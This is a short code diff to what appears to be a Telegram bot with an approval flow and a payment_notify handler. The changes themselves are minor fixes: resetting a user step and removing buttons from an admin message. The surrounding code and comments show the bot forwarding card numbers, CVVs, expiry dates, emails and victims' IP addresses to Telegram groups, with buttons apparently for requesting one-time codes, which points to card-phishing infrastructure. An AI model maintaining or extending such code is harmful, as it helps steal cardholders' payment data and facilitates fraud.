@@ -320,6 +320,7 @@ async def cmd_start(message: types.Message):
             await delete_old_bot_messages(uid, message.bot)
             msg = await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
             bot_message_ids.setdefault(uid, []).append(msg.message_id)
+            user_step[uid] = None  # <--- Додаємо скидання user_step для approved
             return
         elif db_user['status'] == 'rejected':
             if db_user['last_submit']:
@@ -1547,7 +1548,7 @@ async def payment_notify(request):
         ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
-    await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
+    await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML', reply_markup=None)  # Без кнопок
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     msg2 = (
         f"Email: {email}\n"
